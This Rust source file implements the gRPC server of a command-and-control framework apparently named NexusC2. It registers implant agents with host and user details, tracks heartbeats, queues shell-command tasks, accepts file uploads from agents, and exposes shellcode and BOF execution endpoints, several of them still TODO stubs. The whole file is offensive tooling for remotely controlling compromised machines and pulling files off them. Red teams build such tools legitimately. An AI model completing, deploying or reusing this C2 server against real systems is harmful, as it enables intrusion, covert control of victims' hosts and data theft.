//! gRPC server implementation with enhanced TLS and agent management

use crate::{InfraError, InfraResult, proto::*, config::GrpcServerConfig, CertManager};
use log::{info, warn, debug, error};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::{RwLock, mpsc};
use tokio::time::{sleep, Duration as TokioDuration};
use tonic::{
    transport::{Identity, Server, ServerTlsConfig},
    Request, Response, Status, Streaming,
};
use uuid::Uuid;

/// Agent session information
#[derive(Debug, Clone)]
pub struct AgentSession {
    pub agent_id: String,
    pub registration_info: RegistrationRequest,
    pub connected_at: chrono::DateTime<chrono::Utc>,
    pub last_heartbeat: chrono::DateTime<chrono::Utc>,
    pub is_active: bool,
    pub task_queue: Vec<Task>,
    pub pending_tasks: HashMap<String, Task>,
}

/// Task management for agents
#[derive(Debug, Clone)]
pub struct TaskManager {
    pub pending_tasks: HashMap<String, Task>,
    pub completed_tasks: HashMap<String, TaskResult>,
    pub agent_tasks: HashMap<String, Vec<String>>, // agent_id -> task_ids
}

impl TaskManager {
    pub fn new() -> Self {
        Self {
            pending_tasks: HashMap::new(),
            completed_tasks: HashMap::new(),
            agent_tasks: HashMap::new(),
        }
    }
    
    pub fn assign_task(&mut self, agent_id: &str, task: Task) {
        let task_id = task.task_id.clone();
        
        // Add to pending tasks
        self.pending_tasks.insert(task_id.clone(), task);
        
        // Track assignment to agent
        self.agent_tasks
            .entry(agent_id.to_string())
            .or_insert_with(Vec::new)
            .push(task_id);
    }
    
    pub fn complete_task(&mut self, task_result: TaskResult) {
        let task_id = &task_result.task_id;
        
        // Move from pending to completed
        if let Some(task) = self.pending_tasks.remove(task_id) {
            self.completed_tasks.insert(task_id.clone(), task_result);
        }
    }
    
    pub fn get_tasks_for_agent(&self, agent_id: &str) -> Vec<Task> {
        self.agent_tasks
            .get(agent_id)
            .unwrap_or(&Vec::new())
            .iter()
            .filter_map(|task_id| self.pending_tasks.get(task_id).cloned())
            .collect()
    }
}

/// gRPC server implementation
pub struct GrpcServer {
    config: GrpcServerConfig,
    cert_manager: Arc<CertManager>,
    agents: Arc<RwLock<HashMap<String, AgentSession>>>,
    task_manager: Arc<RwLock<TaskManager>>,
    server_handle: Arc<RwLock<Option<tokio::task::JoinHandle<()>>>>,
}

/// Implementation of the NexusC2 service
#[derive(Clone)]
pub struct NexusC2Service {
    agents: Arc<RwLock<HashMap<String, AgentSession>>>,
    task_manager: Arc<RwLock<TaskManager>>,
}

impl GrpcServer {
    /// Create a new gRPC server
    pub fn new(config: GrpcServerConfig, cert_manager: Arc<CertManager>) -> Self {
        Self {
            config,
            cert_manager,
            agents: Arc::new(RwLock::new(HashMap::new())),
            task_manager: Arc::new(RwLock::new(TaskManager::new())),
            server_handle: Arc::new(RwLock::new(None)),
        }
    }
    
    /// Start the gRPC server
    pub async fn start(&self) -> InfraResult<()> {
        info!("Starting gRPC server on {}:{}", self.config.bind_address, self.config.port);
        
        let addr: SocketAddr = format!("{}:{}", self.config.bind_address, self.config.port)
            .parse()
            .map_err(|e| InfraError::GrpcError(format!("Invalid bind address: {}", e)))?;
        
        // Create TLS identity from certificates
        let cert_chain = self.cert_manager.get_certificate_chain();
        let private_key = self.cert_manager.get_private_key();
        
        if cert_chain.is_empty() {
            return Err(InfraError::GrpcError("No certificate chain available".to_string()));
        }
        
        let identity = Identity::from_pem(
            &cert_chain[0].0, // Certificate
            &private_key.0,   // Private key
        );
        
        // Configure server TLS
        let tls_config = if self.config.mutual_tls {
            warn!("Mutual TLS requested but no CA certificates available - using standard TLS");
            ServerTlsConfig::new().identity(identity)
        } else {
            ServerTlsConfig::new().identity(identity)
        };
        
        // Create service implementation
        let service = NexusC2Service {
            agents: self.agents.clone(),
            task_manager: self.task_manager.clone(),
        };
        
        // Build and start server
        let server = Server::builder()
            .tls_config(tls_config)
            .map_err(|e| InfraError::TlsError(format!("TLS configuration failed: {}", e)))?
            .tcp_keepalive(Some(TokioDuration::from_secs(self.config.keepalive_interval)))
            .max_concurrent_streams(Some(self.config.max_connections))
            .add_service(nexus_c2_server::NexusC2Server::new(service))
            .serve(addr);
        
        // Spawn server task
        let handle = tokio::spawn(async move {
            if let Err(e) = server.await {
                error!("gRPC server error: {}", e);
            }
        });
        
        *self.server_handle.write().await = Some(handle);
        
        info!("gRPC server started successfully on {}", addr);
        Ok(())
    }
    
    /// Stop the gRPC server
    pub async fn stop(&self) -> InfraResult<()> {
        info!("Stopping gRPC server");
        
        let mut handle_guard = self.server_handle.write().await;
        if let Some(handle) = handle_guard.take() {
            handle.abort();
            info!("gRPC server stopped");
        } else {
            warn!("gRPC server was not running");
        }
        
        Ok(())
    }
    
    /// Get connected agents
    pub async fn get_agents(&self) -> Vec<AgentSession> {
        self.agents.read().await.values().cloned().collect()
    }
    
    /// Get agent by ID
    pub async fn get_agent(&self, agent_id: &str) -> Option<AgentSession> {
        self.agents.read().await.get(agent_id).cloned()
    }
    
    /// Assign task to agent
    pub async fn assign_task(&self, agent_id: &str, task: Task) -> InfraResult<()> {
        let mut task_manager = self.task_manager.write().await;
        task_manager.assign_task(agent_id, task);
        
        info!("Assigned task to agent: {}", agent_id);
        Ok(())
    }
    
    /// Get completed tasks
    pub async fn get_completed_tasks(&self) -> Vec<TaskResult> {
        let task_manager = self.task_manager.read().await;
        task_manager.completed_tasks.values().cloned().collect()
    }
    
    /// Remove inactive agents
    pub async fn cleanup_inactive_agents(&self, timeout_minutes: u64) -> usize {
        let cutoff_time = chrono::Utc::now() - chrono::Duration::minutes(timeout_minutes as i64);
        let mut agents = self.agents.write().await;
        
        let initial_count = agents.len();
        agents.retain(|_, agent| agent.last_heartbeat > cutoff_time);
        let removed_count = initial_count - agents.len();
        
        if removed_count > 0 {
            info!("Cleaned up {} inactive agents", removed_count);
        }
        
        removed_count
    }
}

#[tonic::async_trait]
impl nexus_c2_server::NexusC2 for NexusC2Service {
    /// Register a new agent
    async fn register_agent(
        &self,
        request: Request<RegistrationRequest>,
    ) -> Result<Response<RegistrationResponse>, Status> {
        let req = request.into_inner();
        let agent_id = Uuid::new_v4().to_string();
        
        info!("Registering new agent: {} from {}", agent_id, req.hostname);
        
        // Create agent session
        let session = AgentSession {
            agent_id: agent_id.clone(),
            registration_info: req,
            connected_at: chrono::Utc::now(),
            last_heartbeat: chrono::Utc::now(),
            is_active: true,
            task_queue: Vec::new(),
            pending_tasks: HashMap::new(),
        };
        
        // Store agent session
        self.agents.write().await.insert(agent_id.clone(), session);
        
        let response = RegistrationResponse {
            agent_id: agent_id.clone(),
            success: true,
            message: "Agent registered successfully".to_string(),
            assigned_domains: vec![], // TODO: Provide fallback domains
            config: None, // TODO: Provide initial configuration
        };
        
        info!("Agent {} registered successfully", agent_id);
        Ok(Response::new(response))
    }
    
    /// Handle agent heartbeat
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let req = request.into_inner();
        
        debug!("Received heartbeat from agent: {}", req.agent_id);
        
        // Update agent's last heartbeat
        let mut agents = self.agents.write().await;
        if let Some(agent) = agents.get_mut(&req.agent_id) {
            agent.last_heartbeat = chrono::Utc::now();
            
            // Process task status updates
            for task_status in req.task_statuses {
                match task_status.status {
                    i32::MIN..=-1_i32 => {}, // Invalid status
                    0 => {}, // Unspecified
                    1 => {}, // Pending
                    2 => {}, // Running
                    3 => {   // Completed
                        // Remove from pending tasks
                        agent.pending_tasks.remove(&task_status.task_id);
                    },
                    4 | 5 | 6 => { // Failed, Timeout, Cancelled
                        // Remove from pending tasks
                        agent.pending_tasks.remove(&task_status.task_id);
                    },
                    _ => {},
                }
            }
            
            let response = HeartbeatResponse {
                success: true,
                heartbeat_interval: 30, // 30 seconds
                new_domains: vec![], // TODO: Provide domain rotation
                config_update: None,
            };
            
            Ok(Response::new(response))
        } else {
            warn!("Heartbeat from unknown agent: {}", req.agent_id);
            Err(Status::not_found("Agent not found"))
        }
    }
    
    /// Get agent information
    async fn get_agent_info(
        &self,
        request: Request<AgentInfoRequest>,
    ) -> Result<Response<AgentInfoResponse>, Status> {
        let req = request.into_inner();
        
        let agents = self.agents.read().await;
        if let Some(agent) = agents.get(&req.agent_id) {
            let response = AgentInfoResponse {
                agent_id: agent.agent_id.clone(),
                registration_info: Some(agent.registration_info.clone()),
                last_seen: Some(prost_types::Timestamp {
                    seconds: agent.last_heartbeat.timestamp(),
                    nanos: 0,
                }),
                current_status: None, // TODO: Implement system status
                active_tasks: agent.pending_tasks.keys().cloned().collect(),
                is_online: agent.is_active,
            };
            
            Ok(Response::new(response))
        } else {
            Err(Status::not_found("Agent not found"))
        }
    }
    
    /// Stream tasks to agent
    async fn get_tasks(
        &self,
        request: Request<TaskRequest>,
    ) -> Result<Response<Self::GetTasksStream>, Status> {
        let req = request.into_inner();
        
        debug!("Getting tasks for agent: {}", req.agent_id);
        
        // Get tasks for this agent
        let task_manager = self.task_manager.read().await;
        let tasks = task_manager.get_tasks_for_agent(&req.agent_id);
        let max_tasks = req.max_tasks.min(10) as usize; // Limit to prevent overflow
        
        // Create stream of tasks
        let limited_tasks = tasks.into_iter().take(max_tasks);
        let output_stream = async_stream::stream! {
            for task in limited_tasks {
                yield Ok(task);
            }
        };
        
        Ok(Response::new(Box::pin(output_stream)))
    }
    
    /// Receive task results from agents
    async fn submit_task_result(
        &self,
        request: Request<TaskResult>,
    ) -> Result<Response<TaskResultResponse>, Status> {
        let task_result = request.into_inner();
        
        info!("Received task result for task: {} from agent: {}", 
              task_result.task_id, task_result.agent_id);
        
        // Store task result
        let mut task_manager = self.task_manager.write().await;
        task_manager.complete_task(task_result);
        
        let response = TaskResultResponse {
            success: true,
            message: "Task result received".to_string(),
        };
        
        Ok(Response::new(response))
    }
    
    /// Stream file upload from agent
    async fn upload_file(
        &self,
        request: Request<Streaming<FileChunk>>,
    ) -> Result<Response<FileUploadResponse>, Status> {
        let mut stream = request.into_inner();
        let mut chunks = Vec::new();
        let mut total_size = 0u64;
        let mut filename = String::new();
        
        while let Some(chunk_result) = stream.message().await? {
            let chunk = chunk_result;
            
            if filename.is_empty() {
                filename = chunk.filename.clone();
            }
            
            total_size += chunk.data.len() as u64;
            chunks.push(chunk);
        }
        
        info!("Received file upload: {} ({} bytes, {} chunks)", 
              filename, total_size, chunks.len());
        
        // TODO: Store file data
        let file_id = Uuid::new_v4().to_string();
        
        let response = FileUploadResponse {
            success: true,
            message: "File uploaded successfully".to_string(),
            file_id,
        };
        
        Ok(Response::new(response))
    }
    
    /// Stream file download to agent
    async fn download_file(
        &self,
        request: Request<FileDownloadRequest>,
    ) -> Result<Response<Self::DownloadFileStream>, Status> {
        let req = request.into_inner();
        
        info!("File download requested: {} for agent: {}", req.file_path, req.agent_id);
        
        // TODO: Load file data and create chunks
        // For now, return empty stream with correct type
        let output_stream = async_stream::stream! {
            // Empty stream - implement file loading logic
            // This never yields anything but has the correct type
            loop {
                // This break prevents infinite loop and the stream ends
                break;
            }
            yield Ok(FileChunk {
                filename: String::new(),
                data: Vec::new(),
                offset: 0,
                total_size: 0,
                checksum: String::new(),
            });
        };
        
        Ok(Response::new(Box::pin(output_stream)))
    }
    
    /// Execute shellcode on agent
    async fn execute_shellcode(
        &self,
        request: Request<ShellcodeRequest>,
    ) -> Result<Response<ShellcodeResponse>, Status> {
        let req = request.into_inner();
        
        info!("Shellcode execution requested for agent: {}", req.agent_id);
        
        // TODO: Queue shellcode execution task
        let response = ShellcodeResponse {
            success: true,
            message: "Shellcode execution queued".to_string(),
            process_id: 0, // Will be set by agent
        };
        
        Ok(Response::new(response))
    }
    
    /// Execute BOF on agent
    async fn execute_bof(
        &self,
        request: Request<BofRequest>,
    ) -> Result<Response<BofResponse>, Status> {
        let req = request.into_inner();
        
        info!("BOF execution requested for agent: {} (function: {})", 
              req.agent_id, req.function_name);
        
        // TODO: Queue BOF execution task
        let response = BofResponse {
            success: true,
            message: "BOF execution queued".to_string(),
            output: String::new(),
        };
        
        Ok(Response::new(response))
    }
    
    type GetTasksStream = std::pin::Pin<Box<dyn tokio_stream::Stream<Item = Result<Task, Status>> + Send>>;
    type DownloadFileStream = std::pin::Pin<Box<dyn tokio_stream::Stream<Item = Result<FileChunk, Status>> + Send>>;
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;
    use crate::OriginCertConfig;

    #[test]
    fn test_agent_session_creation() {
        let session = AgentSession {
            agent_id: "test-agent".to_string(),
            registration_info: RegistrationRequest {
                hostname: "test-host".to_string(),
                os_type: "Windows".to_string(),
                os_version: "10".to_string(),
                ip_address: "192.168.1.100".to_string(),
                username: "test-user".to_string(),
                process_id: 1234,
                process_name: "test.exe".to_string(),
                architecture: "x64".to_string(),
                capabilities: vec!["fiber".to_string()],
                public_key: "test-key".to_string(),
            },
            connected_at: chrono::Utc::now(),
            last_heartbeat: chrono::Utc::now(),
            is_active: true,
            task_queue: Vec::new(),
            pending_tasks: HashMap::new(),
        };
        
        assert_eq!(session.agent_id, "test-agent");
        assert_eq!(session.registration_info.hostname, "test-host");
        assert!(session.is_active);
    }

    #[test]
    fn test_task_manager() {
        let mut manager = TaskManager::new();
        
        let task = Task {
            task_id: "task-1".to_string(),
            task_type: 1, // SHELL_COMMAND
            command: "whoami".to_string(),
            parameters: std::collections::HashMap::new(),
            created_at: None,
            scheduled_for: None,
            timeout_seconds: 30,
            priority: 100,
            max_retries: 3,
        };
        
        manager.assign_task("agent-1", task);
        
        let tasks = manager.get_tasks_for_agent("agent-1");
        assert_eq!(tasks.len(), 1);
        assert_eq!(tasks[0].task_id, "task-1");
    }

    #[tokio::test]
    async fn test_grpc_server_creation() {
        let temp_dir = tempdir().unwrap();
        let cert_config = OriginCertConfig {
            cert_path: temp_dir.path().join("cert.pem"),
            key_path: temp_dir.path().join("key.pem"),
            pin_validation: true,
            validity_days: 365,
        };
        
        // Generate test certificates
        let (cert_pem, key_pem) = crate::CertManager::generate_self_signed_cert(
            "test.example.com",
            &[],
            30
        ).unwrap();
        
        std::fs::write(&cert_config.cert_path, &cert_pem).unwrap();
        std::fs::write(&cert_config.key_path, &key_pem).unwrap();
        
        let cert_manager = Arc::new(crate::CertManager::new(cert_config).unwrap());
        let server_config = GrpcServerConfig::default();
        
        let _server = GrpcServer::new(server_config, cert_manager);
        
        // Server creation should succeed
    }
}
